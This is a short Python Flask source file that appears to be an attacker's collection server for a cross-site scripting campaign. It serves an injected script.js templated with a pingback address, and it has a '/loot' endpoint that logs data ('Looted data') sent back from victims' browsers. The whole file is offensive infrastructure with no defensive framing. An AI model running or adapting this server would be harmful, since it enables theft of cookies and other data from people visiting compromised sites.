from base.webserver import *
from flask import Response
import os

class Campaign(Base):
  def __init__(self):
    super().__init__('xss')

  @route('/script', methods=['GET'])
  def get_script(self):
    print(f'{self.get_remote_addr()} requesting /script')
    if not self.env_has_file('script.js'):
      abort(404)
    template = self.get_template('script.js')
    html = template.render(serveraddr=server.config['pingback'])
    return Response(html, mimetype='text/javascript')

  @route('/loot', defaults={'path': ''})
  @route('/loot/<path:path>')
  def print_loot(self, path):
    print(f'Looted data from {self.get_remote_addr()}: {request.args.get("content")}')
    return 'ok\n'

Campaign.register(server, route_base='/')
